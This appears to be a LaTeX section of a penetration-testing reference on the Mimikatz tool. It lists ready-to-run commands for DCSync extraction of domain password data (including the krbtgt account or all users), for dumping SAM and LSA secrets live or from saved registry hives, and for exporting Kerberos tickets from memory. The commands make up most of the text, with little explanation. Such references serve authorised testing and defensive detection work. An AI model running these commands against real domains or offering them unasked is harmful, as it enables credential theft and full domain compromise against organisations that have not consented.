\section{Mimikatz}
\label{tool:mimikatz}


\subsection*{DCSync}
\label{tool:mimikatz:DCSync}

Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.

\begin{verbatim}
# DCSync only one user
mimikatz# lsadump::dcsync /domain:FQDN /user:krbtgt

# DCSync all users of the domain
mimikatz# lsadump::dcsync /domain:FQDN /all /csv
\end{verbatim}

warning Read-Only Domain Controllers are not allowed to pull password data for users by default.

\subsection{Dumping Credentials}
\label{tool:mimikatz:cred-dumping}

\begin{verbatim}
# Local dumping of SAM secrets on the target
lsadump::sam

# Offline dumping of SAM secrets from exported hives
lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'

# Local dumping of LSA secrets on the target
lsadump::secrets

# Offline dumping LSA secrets from exported hives
lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
\end{verbatim}


\subsection{Extracting Tickets from Memory}
\label{tool:mimikatz:KRBDUmp}

\begin{verbatim}
base64 /out:true
kerberos::list /export
\end{verbatim}
